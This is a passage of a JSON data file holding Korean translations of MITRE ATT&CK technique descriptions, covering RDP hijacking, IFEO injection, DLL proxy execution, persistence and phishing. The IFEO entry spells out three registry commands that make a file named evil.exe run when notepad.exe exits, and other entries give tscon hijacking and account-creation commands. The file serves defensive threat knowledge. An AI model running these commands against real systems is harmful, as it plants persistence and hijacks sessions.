    "description": "원격 데스크톱은 운영 체제에서 일반적인 기능입니다. 이를 통해 사용자는 원격 시스템의 데스크톱 그래픽 사용자 인터페이스와 인터랙티브 세션에 로그인할 수 있습니다. Microsoft는 원격 데스크톱 프로토콜(RDP)의 구현을 원격 데스크톱 서비스(RDS)라고 부릅니다. 다른 구현 및 서드파티 도구도 RDS와 유사한 그래픽 액세스를 제공합니다.\n\n적대자는 서비스가 활성화되어 있고 알려진 자격 증명을 가진 계정에 대한 액세스를 허용하는 경우 RDP/RDS를 통해 원격 시스템에 연결할 수 있습니다. 적대자는 RDP와 함께 사용할 자격 증명을 얻기 위해 자격 증명 액세스 기술을 사용할 가능성이 높습니다. 적대자는 또한 지속성을 위해 접근성 기능 기술과 함께 RDP를 사용할 수 있습니다.\n\n적대자는 또한 합법적인 사용자의 원격 세션을 훔치는 RDP 세션 하이재킹을 수행할 수 있습니다. 일반적으로 사용자는 다른 사람이 자신의 세션을 훔치려고 할 때 알림을 받고 질문을 받습니다. 시스템 권한을 가지고 있으며 터미널 서비스 콘솔을 사용하여 <code>c:\\windows\\system32\\tscon.exe [훔칠 세션 번호]</code>를 입력함으로써, 적대자는 자격 증명이나 사용자에게 알림 없이 세션을 하이재킹할 수 있습니다. 이는 원격 또는 로컬에서 활성 세션이나 연결이 끊긴 세션으로 수행될 수 있습니다. 이는 또한 도메인 관리자 또는 더 높은 권한의 계정 세션을 훔침으로써 원격 시스템 검색 및 권한 상승으로 이어질 수 있습니다. 이 모든 것은 기본 Windows 명령을 사용하여 수행될 수 있지만 RedSnarf에서 기능으로 추가되기도 했습니다.",
    "external_id": "T1076",
    "modified": "2020-02-11T18:24:04.507Z",
    "translated": true
  },
  {
    "title": "Authentication Package",
    "description": "Windows 인증 패키지 DLL은 시스템 시작 시 로컬 보안 기관(LSA) 프로세스에 의해 로드됩니다. 이들은 운영 체제에 여러 로그온 프로세스와 여러 보안 프로토콜에 대한 지원을 제공합니다. \n\n적대자들은 LSA 인증 패키지에서 제공하는 자동 시작 메커니즘을 활용하여 지속성을 확보할 수 있습니다. 이를 위해 Windows 레지스트리 위치에 이진 파일에 대한 참조를 추가합니다. 이때 키 값으로 \"Authentication Packages\"에 <target binary>를 설정합니다. 그러면 인증 패키지가 로드될 때 시스템에 의해 이진 파일이 실행됩니다.",
    "external_id": "T1131",
    "modified": "2020-01-24T15:43:25.280Z",
    "translated": true
  },
  {
    "title": "Extra Window Memory Injection",
    "description": "윈도우를 생성하기 전에 그래픽 기반의 윈도우 프로세스는 윈도우 클래스에 등록해야 하며, 이는 외관과 동작을 규정합니다. 새 윈도우 클래스의 등록은 해당 클래스의 인스턴스 당 최대 40바이트의 추가 윈도우 메모리(EWM)를 요청할 수 있습니다. 이 EWM은 해당 윈도우에 특정한 데이터를 저장하기 위해 사용되며, 그 값을 설정하고 가져오기 위한 특정 응용 프로그래밍 인터페이스(API) 기능이 있습니다.\n\nEWM은 작지만 32비트 포인터를 저장할 수 있을 만큼 충분히 크며, 종종 윈도우 프로시저를 가리키는 데 사용됩니다. 악성코드는 이 메모리 위치를 활용하여 공격 연쇄의 일부로 코드가 프로세스의 공유 메모리 섹션에 작성되고, EWM에 코드에 대한 포인터를 배치한 다음, 프로세스의 EWM 주소로 실행 제어를 반환하여 실행을 유도할 수 있습니다.\n\nEWM 주입을 통한 실행은 별도의 활성 프로세스의 주소 공간에서 이루어질 수 있습니다. 이는 대상 프로세스의 메모리와 가능하면 상승된 권한에 접근할 수 있게 합니다. 공유 섹션에 페이로드를 작성하는 것은 WriteProcessMemory 및 CreateRemoteThread와 같은 고도로 모니터링되는 API 호출의 사용을 피하는 데에도 도움이 됩니다. 더 복잡한 악성코드 샘플은 윈도우 프로시저와 다른 시스템 기능의 조합을 트리거하여 대상 프로세스의 실행 가능한 부분 안에 악성 페이로드를 재작성함으로써 데이터 실행 방지(DEP)와 같은 보호 메커니즘을 우회할 수 있는 가능성도 있습니다.",
    "external_id": "T1181",
    "modified": "2020-11-10T18:29:30.479Z",
    "translated": true
  },
  {
    "title": "Launchctl",
    "description": "Launchctl은 macOS의 launchd 프로세스를 제어하며, 이 프로세스는 실행 에이전트와 실행 데몬과 같은 작업을 처리하지만, 다른 명령이나 프로그램도 실행할 수 있습니다. Launchctl은 커맨드라인에서 하위 명령을 입력받거나 상호작용적으로 또는 표준 입력에서 리디렉션 받아 실행할 수 있습니다. 실행 에이전트나 실행 데몬을 로드하거나 다시 로드함으로써 공격자는 영속성을 설치하거나 자신이 한 변경 사항을 실행할 수 있습니다. launchctl에서 명령을 실행하는 것은 간단하며, 로드, 언로드 또는 재로드하는 작업은 높은 권한을 요구할 수 있습니다.\n\n공격자는 이 기능을 악용하여 코드를 실행하거나 launchctl이 허용된 프로세스인 경우 화이트리스트를 우회할 수 있습니다.",
    "external_id": "T1152",
    "modified": "2020-03-10T18:31:00.336Z",
    "translated": true
  },
  {
    "title": "Domain Generation Algorithms",
    "description": "적대자는 도메인 생성 알고리즘(DGA)을 사용하여 정적 IP 주소나 도메인 목록에 의존하는 대신 명령 및 제어 트래픽의 목적지를 동적으로 식별할 수 있습니다. 이를 통해 방어자가 명령 및 제어 채널을 차단하거나 추적하거나 장악하기가 훨씬 더 어려워질 수 있습니다. 이는 악성코드가 지침을 위해 확인할 수 있는 도메인이 수천 개가 될 가능성이 있기 때문입니다.\n\nDGA는 도메인 이름을 생성할 때 각각의 문자를 생성하여 나타나게 되는 무작위 또는 “횡설수설” 문자열 형태를 취할 수 있습니다. 또는 일부 DGA는 문자가 아닌 단어를 연결하여 단어를 전체 단위로 사용하는 방법을 사용합니다. 많은 DGA는 시간 기반으로 작동하여 각 기간(시간별, 일별, 월별 등)에 대해 다른 도메인을 생성합니다. 다른 DGA는 또한 시드 값을 포함하여 방어자가 미래의 도메인을 예측하는 것을 더 어렵게 만듭니다.\n\n적대자는 [대체 채널]의 목적을 위해 DGA를 사용할 수 있습니다. 주 명령 및 제어 서버와의 연락이 끊어지면 악성코드는 DGA를 사용하여 명령 및 제어를 재establish하는 수단으로 활용할 수 있습니다.",
    "external_id": "T1483",
    "modified": "2020-11-10T18:28:56.957Z",
    "translated": true
  },
  {
    "title": "File Deletion",
    "description": "적대자는 침입 활동으로 남긴 파일을 삭제할 수 있습니다. 악성 코드, 도구 또는 적대자가 시스템에 드롭하거나 생성한 다른 비원주 파일은 네트워크 내에서 수행된 작업과 방법을 나타내는 흔적을 남길 수 있습니다. 이러한 파일의 제거는 침입 중에 발생할 수 있으며, 적대자의 흔적을 최소화하기 위한 사후 침입 과정의 일환으로 발생할 수 있습니다.\n\n호스트 운영 체제에서 정리 작업을 수행하기 위한 도구가 제공되지만, 적대자는 다른 도구를 사용할 수도 있습니다. 예를 들어, DEL과 같은 기본 명령어 기능이나 Windows Sysinternals SDelete와 같은 보안 삭제 도구 또는 기타 제3자 파일 삭제 도구가 있습니다.",
    "external_id": "T1107",
    "modified": "2020-01-31T12:36:39.086Z",
    "translated": true
  },
  {
    "title": "Private Keys",
    "description": "개인 암호화 키와 인증서는 인증, 암호화/복호화, 그리고 디지털 서명을 위해 사용된다.\n\n적대자는 손상된 시스템에서 개인 키를 수집하여 SSH와 같은 원격 서비스에 인증하는 데 사용하거나 이메일과 같은 다른 수집된 파일을 복호화하는 데 사용할 수 있다. 일반적인 키 및 인증서 파일 확장자는 .key, .pgp, .gpg, .ppk, .p12, .pem, .pfx, .cer, .p7b, .asc 등이 있다. 적대자는 또한 *nix 기반 시스템의 경우 SSH 키를 위한 <code>~/.ssh</code>와 같은 일반 키 디렉토리나 Windows의 <code>C:\\Users\\(username)\\.ssh\\</code>를 살펴볼 수 있다.\n\n개인 키는 작동을 위해 비밀번호나 암호 문구를 요구해야 하므로, 적대자는 키로깅을 위한 입력 캡처를 사용하거나 오프라인에서 암호 문구를 브루트 포스 공격할 수도 있다.\n\n해킹된 시스템에서 암호화 키 및 인증서와 관련된 파일 확장자를 검색하는 적대자 도구가 발견되었다.",
    "external_id": "T1145",
    "modified": "2020-02-18T16:51:57.775Z",
    "translated": true
  },
  {
    "title": "AppleScript",
    "description": "macOS 및 OS X 응용 프로그램은 프로세스 간 통신(IPC)을 위해 서로에게 AppleEvent 메시지를 보냅니다. 이러한 메시지는 로컬 또는 원격 IPC를 위해 AppleScript로 쉽게 스크립팅할 수 있습니다. Osascript는 AppleScript 및 기타 오픈 스크립팅 아키텍처(OSA) 언어 스크립트를 실행합니다. 시스템에 설치된 OSA 언어의 목록은 osalang 프로그램을 사용하여 찾을 수 있습니다.\n\nAppleEvent 메시지는 독립적으로 또는 스크립트의 일부로 보낼 수 있습니다. 이러한 사건은 열린 윈도우를 찾고, 키 입력을 보내며, 거의 모든 열린 응용 프로그램과 로컬 또는 원격으로 상호 작용할 수 있습니다.\n\n공격자는 이를 사용하여 열린 SSH 연결과 상호 작용하고, 원격 머신으로 이동하며, 심지어 사용자에게 가짜 대화 상자를 표시할 수 있습니다. 이러한 이벤트는 원격으로 응용 프로그램을 시작할 수는 없지만(로컬에서는 시작할 수 있음), 이미 원격에서 실행 중인 응용 프로그램과 상호 작용할 수 있습니다. 스크립팅 언어이기 때문에, 파이썬을 통한 리버스 셸과 같은 더 일반적인 기법을 시작하는 데 사용할 수도 있습니다. 스크립트는 명령줄에서 osascript /path/to/script 또는 osascript -e \"script here\"를 통해 실행할 수 있습니다.",
    "external_id": "T1155",
    "modified": "2020-04-14T13:26:00.846Z",
    "translated": true
  },
  {
    "title": "Image File Execution Options Injection",
    "description": "이미지 파일 실행 옵션(IFEO)은 개발자가 애플리케이션에 디버거를 연결할 수 있도록 해줍니다. 프로세스가 생성될 때, 애플리케이션의 IFEO에 존재하는 디버거가 애플리케이션 이름 앞에 추가되어 새로운 프로세스가 디버거 아래에서 실행됩니다.\n\nIFEO는 레지스트리를 통해 직접 설정하거나 GFlags 도구의 글로벌 플래그에서 설정할 수 있습니다. IFEO는 레지스트리의 HKLM\\SOFTWARE\\{Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<executable>에 <code>Debugger</code> 값으로 나타나며, 여기서 <code><executable></code>는 디버거가 연결된 바이너리입니다.\n\nIFEO는 또한 지정된 프로그램이 조용히 종료될 때 임의의 모니터 프로그램을 실행하도록 설정할 수 있습니다(즉, 스스로 또는 두 번째 비 커널 모드 프로세스에 의해 조기 종료될 때). 디버거와 유사하게, 조용한 종료 모니터링은 GFlags를 통해 또는 <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\</code>의 IFEO 및 조용한 프로세스 종료 레지스트리 값을 직접 수정하여 활성화할 수 있습니다.\n\nnotepad.exe가 종료될 때 evil.exe 프로세스가 시작되는 예시: \n\n* reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\" /v GlobalFlag /t REG_DWORD /d 512\n* reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" /v ReportingMode /t REG_DWORD /d 1\n* reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" /v MonitorProcess /d \"C:\\temp\\evil.exe\"\n\n프로세스 주입과 유사하게, 이러한 값은 악성 실행 파일이 컴퓨터의 별도 프로세스 맥락에서 로드되고 실행되도록 하여 지속성과 특권 상승을 얻기 위해 악용될 수 있습니다. IFEO 메커니즘을 설치하면 지속적인 호출을 통해 지속 가능성을 제공할 수도 있습니다.\n\n악성 코드도 IFEO를 방어 회피에 사용하여 다양한 시스템 및 보안 애플리케이션을 효과적으로 비활성화하고 리디렉션하는 유효하지 않은 디버거를 등록할 수 있습니다.",
    "external_id": "T1183",
    "modified": "2020-11-10T18:29:30.417Z",
    "translated": true
  },
  {
    "title": "Rundll32",
    "description": "rundll32.exe 프로그램은 임의의 이진 파일을 실행하도록 호출될 수 있습니다. 공격자는 이 기능을 이용하여 코드를 프록시 실행하여 rundll32.exe 프로세스의 실행을 모니터링하지 않는 보안 도구를 피하려고 할 수 있습니다. 이는 화이트리스트나 Windows가 정상적인 작업을 위해 rundll32.exe를 사용하는 것으로 인해 발생하는 오탐지 때문입니다.\n\nrundll32.exe는 undocumented shell32.dll 함수들을 통해 Control Panel Item 파일(.cpl)을 실행하는 데 사용할 수 있습니다. .cpl 파일을 두 번 클릭하면 또한 rundll32.exe가 실행됩니다.\n\nrundll32는 JavaScript와 같은 스크립트를 실행하는 데에도 사용될 수 있습니다. 이는 다음과 유사한 문법을 사용하여 수행할 수 있습니다. 이 행동은 Poweliks와 같은 악성 소프트웨어에서 사용된 사례가 있습니다.",
    "external_id": "T1085",
    "modified": "2020-01-31T19:01:41.919Z",
    "translated": true
  },
  {
    "title": "Modify Existing Service",
    "description": "Windows 서비스 구성 정보는 서비스의 실행 파일 경로 또는 복구 프로그램/명령을 포함하여 레지스트리에 저장됩니다. 서비스 구성은 sc.exe와 같은 유틸리티를 사용하여 수정할 수 있습니다.\n\n적대자는 시스템 유틸리티를 사용하거나 Windows API와 상호작용하는 맞춤형 도구를 사용하여 기존 서비스를 수정하여 시스템에 맬웨어를 지속시킬 수 있습니다. 기존 서비스의 사용은 탐지 분석을 더 어렵게 만들 수 있는 일종의 변장입니다. 기존 서비스를 수정하면 그 기능이 중단될 수 있거나 비활성화되거나 일반적으로 사용되지 않는 서비스를 활성화할 수 있습니다.\n\n적대자는 또한 악성 복구 프로그램/명령을 실행하기 위해 서비스가 의도적으로 손상되거나 종료되도록 할 수 있습니다.",
    "external_id": "T1031",
    "modified": "2020-03-16T16:05:53.825Z",
    "translated": true
  },
  {
    "title": "Local Account",
    "description": "적대자는 피해 시스템에 대한 접근을 유지하기 위해 로컬 계정을 생성할 수 있습니다. 로컬 계정은 조직에서 사용자, 원격 지원, 서비스 또는 단일 시스템이나 서비스에 대한 관리를 위해 설정한 계정입니다. \n\n충분한 접근 수준을 갖춘 경우, Windows에서 `net user /add` 명령을 사용하여 로컬 계정을 생성할 수 있습니다. macOS 시스템에서는 `dscl -create` 명령을 사용하여 로컬 계정을 생성할 수 있습니다. 로컬 계정은 일반적인 명령을 통해 네트워크 장치에 추가되거나 Kubernetes 클러스터에 `kubectl` 유틸리티를 사용하여 추가될 수도 있습니다.\n\n이러한 계정은 시스템에 지속적인 원격 접근 도구를 배포할 필요 없이 2차 자격 증명 접근을 설정하는 데 사용될 수 있습니다.",
    "external_id": "T1136.001",
    "modified": "2023-10-16T17:40:37.995Z",
    "translated": true
  },
  {
    "title": "At (Linux)",
    "description": "적대자는 초기, 반복 또는 미래의 악성 코드 실행을 위해 작업 예약을 수행하기 위해 'at' 유틸리티를 악용할 수 있습니다. 리눅스 운영 체제 내의 'at' 명령은 관리자가 작업을 예약할 수 있도록 합니다.\n\n적대자는 리눅스 환경에서 'at'를 사용하여 시스템 시작 시 또는 일정한 기준으로 프로그램을 실행하여 지속성을 유지할 수 있습니다. 'at'는 또한 측면 이동의 일환으로 원격 실행을 수행하거나 지정된 계정의 컨텍스트에서 프로세스를 실행하는 데 악용될 수 있습니다.\n\n적대자는 또한 작업을 사용하여 대화형 시스템 셸을 생성하거나 시스템 명령을 실행하여 제한된 환경에서 탈출하기 위해 'at'를 악용할 수 있습니다. 유사하게, 'at'는 이진 파일이 <code>sudo</code>를 통해 슈퍼유저로 실행될 수 있을 경우 권한 상승에도 사용될 수 있습니다.",
    "external_id": "T1053.001",
    "modified": "2022-04-16T20:45:01.814Z",
    "translated": true
  },
  {
    "title": "Hooking",
    "description": "Windows 프로세스는 재사용 가능한 시스템 리소스를 요구하는 작업을 수행하기 위해 애플리케이션 프로그래밍 인터페이스(API) 함수들을 자주 활용합니다. Windows API 함수들은 일반적으로 동적 링크 라이브러리(DLL)에 저장되어 내보내기 함수로 존재합니다.\n\n후킹(hooking)은 이러한 함수에 대한 호출을 리디렉션하는 것이며, 다음을 통해 구현될 수 있습니다:\n\n* **후크 프로시저**는 메시지, 키 입력 및 마우스 입력과 같은 이벤트에 응답하여 지정된 코드를 가로채고 실행합니다.\n* **임포트 주소 테이블(IAT) 후킹**은 API 함수에 대한 포인터가 저장된 프로세스의 IAT에 수정 사항을 적용합니다.\n* **인라인 후킹**은 코드 흐름을 리디렉션하기 위해 API 함수의 처음 몇 바이트를 덮어씁니다.\n\n프로세스 인젝션과 유사하게, 공격자는 후킹을 사용하여 다른 프로세스의 컨텍스트 내에서 악성 코드를 로드하고 실행하며, 실행을 감추면서 해당 프로세스의 메모리에 접근하고, 경우에 따라 권한 상승을 가능하게 합니다. 후킹 메커니즘을 설치하면 일반적인 사용을 통해 함수가 호출될 때 지속성을 제공할 수 있습니다.\n\n악성 후킹 메커니즘은 사용자 인증 정보를 드러내는 매개변수를 포함한 API 호출도 캡처할 수 있습니다.\n\n후킹은 루트킷에 의해 일반적으로 사용되며, 이는 파일, 프로세스, 레지스트리 키 및 기타 객체를 숨겨 악성 코드와 관련된 행동을 감추기 위해 사용됩니다.",
    "external_id": "T1179",
    "modified": "2020-11-10T18:29:30.516Z",
    "translated": true
  },
  {
    "title": "Plist Modification",
    "description": "위협자는 지속성을 설정하는 과정의 일환으로 속성 목록 파일(plist 파일)을 수정하여 자신의 코드를 실행할 수 있습니다. plist 파일은 macOS 애플리케이션이 애플리케이션 및 서비스의 속성과 구성 설정을 저장하는 데 사용됩니다. 애플리케이션은 정보 plist 파일인 Info.plist를 사용하여 운영 체제에 런타임에서 애플리케이션을 처리하는 방법을 키와 값 형식의 구조화된 메타데이터를 통해 알립니다. plist 파일은 XML 형식으로 포맷되고 Apple의 Core Foundation DTD를 기반으로 하며 텍스트 또는 바이너리 형식으로 저장될 수 있습니다.\n\n위협자는 실행되는 이진 파일의 경로를 수정하고, 명령줄 인수를 추가하며, 자동 실행 위치의 plist 파일에 키/값 쌍을 삽입할 수 있습니다. 이러한 수정된 plist 파일은 사용자 로그인 또는 시스템 시작 시 실행됩니다. 이러한 위치의 plist 파일을 수정함으로써, 위협자는 <code>DYLD_INSERT_LIBRARIES</code> 키와 악성 dylib의 경로를 포함하는 사전을 추가하여 악성 동적 라이브러리(dylib)를 실행할 수 있습니다. 사용자 로그인 시 plist가 실행을 위해 호출되고, 악성 dylib는 프로세스 공간 내에서 실행됩니다. 지속성은 애플리케이션의 <code>Info.plist</code> 파일에서 <code>LSEnvironment</code> 키를 수정하여도 달성할 수 있습니다.",
    "external_id": "T1547.011",
    "modified": "2022-04-20T21:06:07.560Z",
    "translated": true
  },
  {
    "title": "System Firmware",
    "description": "BIOS(기본 입출력 시스템)과 통합 확장 가능한 펌웨어 인터페이스(UEFI) 또는 확장 가능 펌웨어 인터페이스(EFI)는 운영 체제와 컴퓨터 하드웨어 간의 소프트웨어 인터페이스로 작동하는 시스템 펌웨어의 예입니다. \n\nBIOS와 (U)EFI와 같은 시스템 펌웨어는 컴퓨터의 기능성을 뒷받침하며, 적대적인 존재가 악의적인 활동을 수행하거나 지원하도록 수정할 수 있습니다. 시스템 펌웨어를 덮어쓰는 능력이 존재하며, 이는 정교한 적에게 감지하기 어려운 방법으로 시스템에 영구성을 부여하기 위해 악성 펌웨어 업데이트를 설치할 수 있는 수단을 제공할 수 있습니다.",
    "external_id": "T1019",
    "modified": "2020-03-30T19:16:29.473Z",
    "translated": true
  },
  {
    "title": "Change Default File Association",
    "description": "파일이 열릴 때, 해당 파일을 열기 위해 사용되는 기본 프로그램(파일 연관 또는 핸들러라고도 함)이 확인됩니다. 파일 연관 선택은 Windows 레지스트리에 저장되며, 사용자, 관리자 또는 레지스트리에 접근할 수 있는 프로그램이 수정할 수 있습니다. 응용 프로그램은 특정 파일 확장자의 파일 연관을 수정하여 주어진 확장자의 파일이 열릴 때 임의의 프로그램을 호출할 수 있습니다.\n\n시스템 파일 연관은 <code>HKEY_CLASSES_ROOT\\.[확장자]</code> 아래에 나열되며, 예를 들어 <code>HKEY_CLASSES_ROOT\\.txt</code>입니다. 이 항목들은 <code>HKEY_CLASSES_ROOT\\[핸들러]</code>에 위치한 해당 확장자를 위한 핸들러를 가리킵니다. 다양한 명령은 <code>HKEY_CLASSES_ROOT\\[핸들러]\\shell\\[행동]\\command</code>의 하위 키로 나열됩니다. 예를 들어:\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command</code>\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\print\\command</code>\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\command</code>\n\n나열된 키의 값들은 핸들러가 파일 확장자를 열 때 실행되는 명령입니다. 공격자는 이러한 값을 수정하여 임의의 명령을 지속적으로 실행할 수 있습니다.",
    "external_id": "T1042",
    "modified": "2020-01-24T13:41:32.520Z",
    "translated": true
  },
  {
    "title": "Regsvr32",
    "description": "Regsvr32.exe는 Windows 시스템에서 동적 링크 라이브러리(DLL)를 포함한 객체 연결 및 포함 컨트롤을 등록하고 등록 해제하는 데 사용되는 명령줄 프로그램입니다. Regsvr32.exe는 임의의 바이너리를 실행하는 데 사용될 수 있습니다.\n\n공격자는 이 기능을 이용하여 regsvr32.exe 프로세스의 실행 및 모듈 로드를 모니터링하지 않는 보안 도구를 회피하기 위해 코드를 프록시 실행할 수 있습니다. 이는 화이트리스트 또는 Windows에서 regsvr32.exe를 정상 운영에 사용하는 경우의 오탐지로 인한 것입니다. Regsvr32.exe는 또한 Microsoft 서명 바이너리입니다.\n\nRegsvr32.exe는 사용 권한 아래에서 DLL을 실행하기 위해 COM 스크립틀렛을 로드하는 기능을 사용하여 프로세스 화이트리스트를 우회하는 데도 활용될 수 있습니다. Regsvr32.exe는 네트워크 및 프록시 인식 기능이 있기 때문에, 스크립트는 외부 웹 서버의 파일로 URL을 전달하여 호출 시 인자로 로드될 수 있습니다. 이 방법은 COM 객체가 실제로 등록되지 않고 단지 실행되기 때문에 레지스트리에 변경을 가하지 않습니다. 이 기법의 변형은 \"Squiblydoo\" 공격으로 자주 언급되며, 정부를 목표로 하는 캠페인에서 사용되었습니다.\n\nRegsvr32.exe는 또한 지속성을 확보하기 위해 COM 객체를 등록하는 데 활용될 수 있습니다.",
    "external_id": "T1117",
    "modified": "2020-01-31T19:00:56.475Z",
    "translated": true
  },
  {
    "title": "Re-opened Applications",
    "description": "Mac OS X 10.7 (라이온)부터 사용자는 기기를 재부팅할 때 특정 응용 프로그램이 다시 열리도록 지정할 수 있습니다. 일반적으로 이는 응용 프로그램별로 그래픽 사용자 인터페이스(GUI)를 통해 수행되지만, 이 정보가 포함된 속성 목록 파일(plist)도 있으며, 해당 파일은 사용자 라이브러리의 Preferences 폴더에 위치합니다. \n\n적대자는 이러한 파일 중 하나를 직접 수정하여 자신의 악성 실행 파일에 대한 링크를 포함시켜 사용자가 기기를 재부팅할 때마다 지속성을 제공할 수 있습니다.",
    "external_id": "T1164",
    "modified": "2020-01-24T18:26:18.933Z",
    "translated": true
  },
  {
    "title": "Indicator Blocking",
    "description": "적대자는 일반적으로 센서에 의해 수집되고 분석되는 지표 또는 이벤트를 차단하려 할 수 있습니다. 이는 이벤트 추적을 위한 Windows(ETW)와 같은 호스트 기반 센서를 악의적으로 리디렉션하거나 비활성화하는 것을 포함할 수 있으며, 이벤트 원격 탐지의 수집 및 흐름을 제어하는 설정을 조작함으로써 발생할 수 있습니다. 이러한 설정은 시스템의 구성 파일 및/또는 레지스트리에 저장되며, PowerShell 또는 Windows 관리 도구와 같은 관리 유틸리티를 통해 접근할 수 있습니다.\n\nETW 중단은 여러 방식으로 이뤄질 수 있으며, 가장 직접적인 방법은 PowerShell의 Set-EtwTraceProvider cmdlet을 사용하여 조건을 정의하거나 레지스트리에 직접 인터페이스하여 변경하는 것입니다.\n\n지표의 네트워크 기반 보고의 경우, 적대자는 중앙 분석을 방지하기 위해 보고와 관련된 트래픽을 차단할 수 있습니다. 이는 텔레메트를 전달하는 책임이 있는 로컬 프로세스를 중지하거나, 특정 이벤트 집계 호스트(e.g., 보안 정보 및 이벤트 관리(SIEM) 제품)로의 트래픽을 차단하는 호스트 기반 방화벽 규칙을 생성하는 등의 다양한 방법으로 이루어질 수 있습니다.",
    "external_id": "T1054",
    "modified": "2020-03-19T19:10:25.404Z",
    "translated": true
  },
  {
    "title": "Spearphishing Voice",
    "description": "적대자는 음성 통신을 사용하여 목표로 삼는 과정에서 활용될 수 있는 민감한 정보를 끌어낼 수 있습니다. 정보를 위한 스피어피싱은 목표를 속여서 정보, 주로 자격 증명이나 기타 실행 가능한 정보를 누출하게 하려는 시도입니다. 정보에 대한 스피어피싱은 종종 정보 수집의 이유가 있는 소스로 전직하는 등 사회적 공학 기법을 포함하며, 수신자에게 긴박감이나 경각심을 조성하기도 합니다.\n\n모든 형태의 피싱은 전자적으로 전달되는 사회 공학입니다. 이 시나리오에서는 적대자가 전화 통화를 통해 피해자로부터 민감한 정보를 끌어냅니다. 음성 피싱(또는 \"비싱\")으로 알려진 이러한 통신은 적대자가 수동적으로 수행하거나, 고용된 콜센터 또는 자동화된 로보콜을 통해 실행될 수 있습니다. 음성 피싱을 하는 주체는 자신의 전화 번호를 위조하면서 신뢰할 수 있는 주체, 예를 들어 비즈니스 파트너나 기술 지원 직원으로 가장할 수 있습니다.\n\n피해자는 또한 적대자가 기밀 정보를 수집하려고 시도하는 전화 번호로 전화를 하도록 유도하는 피싱 메시지를 받을 수 있습니다(\"콜백 피싱\"). \n\n적대자는 또한 이전 정찰 노력에서 얻은 정보를 사용하여 피해자에게 더욱 설득력 있고 믿을 수 있는 사전 정보를 맞춤화할 수도 있습니다.",
    "external_id": "T1598.004",
    "modified": "2023-09-08T21:03:35.477Z",
    "translated": true
  },
  {
    "title": "Redundant Access",
    "description": "이 기술은 더 이상 사용되지 않습니다. 적절할 경우 계정 생성, 웹 셸, 외부 원격 서비스 등을 사용하십시오.\n\n적대 세력은 원격 서비스에 대한 자격 증명 접근 방식이나 여러 가지 원격 액세스 도구를 사용하여 액세스 메커니즘이 감지되거나 완화되더라도 액세스를 유지할 수 있습니다.\n\n한 종류의 도구가 감지되어 차단되거나 제거되는 경우, 조직이 적대 세력의 도구와 접근에 대한 완전한 이해를 하지 못했다면, 적대 세력은 네트워크에 대한 액세스를 유지할 수 있습니다. 적대 세력은 또한 외부 VPN과 같은 외부 원격 서비스를 사용하기 위해 유효 계정에 접근하려고 할 수 있습니다. 이는 목표 네트워크 내에서 배포된 원격 액세스 도구에 중단이 발생하더라도 액세스를 유지하는 방법입니다. 적대 세력은 클라우드 기반 인프라와 응용 프로그램을 통해 액세스를 유지할 수도 있습니다.\n\n웹 셸 사용은 외부에서 접근 가능한 웹 서버를 통해 네트워크에 대한 액세스를 유지하는 한 가지 방법입니다.",
    "external_id": "T1108",
    "modified": "2024-10-14T22:11:30.271Z",
    "translated": true
  },
  {
    "title": "Spearphishing Attachment",
    "description": "스피어피싱 첨부파일은 스피어피싱의 특정 변형입니다. 스피어피싱 첨부파일은 이메일에 첨부된 악성 소프트웨어를 사용하는 점에서 다른 형태의 스피어피싱과 다릅니다. 모든 형태의 스피어피싱은 특정 개인, 회사 또는 산업을 목표로 한 전자적으로 전달되는 사회 공학입니다. 이 시나리오에서 공격자는 스피어피싱 이메일에 파일을 첨부하고 일반적으로 사용자의 실행을 통해 실행을 얻으려 합니다.\n\n첨부파일의 옵션으로는 Microsoft Office 문서, 실행 파일, PDF 또는 압축 파일 등이 있습니다. 첨부파일을 열면(및 잠재적으로 보호 장치를 우회할 경우), 공격자의 페이로드는 취약점을 이용하거나 사용자의 시스템에서 직접 실행됩니다. 스피어피싱 이메일의 텍스트는 일반적으로 파일을 열어야 하는 그럴듯한 이유를 제시하려 하고, 이를 위해 시스템 보호 장치를 우회하는 방법을 설명할 수도 있습니다. 이메일에는 또한 이메일 경계 방어를 피하기 위해 첨부파일을 암호 해독하는 방법, 예를 들어 zip 파일 비밀번호에 대한 지침이 포함될 수 있습니다. 공격자들은 첨부된 실행 파일을 문서 파일처럼 보이게 만들기 위해 파일 확장자와 아이콘을 조작하거나 한 애플리케이션에서 이용할 파일이 다른 애플리케이션 파일처럼 보이도록 조작하는 경우가 많습니다.",
    "external_id": "T1193",
    "modified": "2020-03-02T19:08:17.884Z",
    "translated": true
  },
  {
    "title": "Kernel Modules and Extensions",
    "description": "로드가능 커널 모듈(Loadable Kernel Modules, LKM)은 필요에 따라 커널에 로드되고 언로드될 수 있는 코드 조각입니다. 이들은 시스템을 재부팅할 필요 없이 커널의 기능을 확장합니다. 예를 들어, 모듈의 한 유형은 장치 드라이버로, 이는 커널이 시스템에 연결된 하드웨어에 접근할 수 있도록 합니다. 악의적으로 사용될 경우, 로드 가능한 커널 모듈은 운영 체제에서 가장 높은 권한(Ring 0)으로 실행되는 커널 모드 루트킷의 일종이 될 수 있습니다. 적대자는 로드 가능한 커널 모듈을 사용하여 시스템에 은밀히 지속성을 확보하고 방어를 회피할 수 있습니다. 실제 환경에서 이와 관련된 사례가 발견되었으며, 일부 오픈 소스 프로젝트도 존재합니다.\n\nLKM 기반 루트킷의 일반적인 특징에는 자신을 숨기기, 파일, 프로세스 및 네트워크 활동의 선택적 숨김, 로그 변조, 인증된 백도어 제공 및 비특권 사용자의 루트 접근 허용 등이 포함됩니다.\n\n커널 확장(일명 kext)은 macOS에서 LKM과 유사하게 시스템에 기능을 로드하기 위해 사용됩니다. 이들은 <code>kextload</code> 및 <code>kextunload</code> 명령을 통해 로드되고 언로드됩니다. 이를 활용할 수 있는 여러 사례가 발견되었습니다. 실제 환경에서도 예시가 발견되었습니다.",
    "external_id": "T1215",
    "modified": "2021-03-30T00:59:53.427Z",
    "translated": true
  },
  {
    "title": "Security Support Provider",
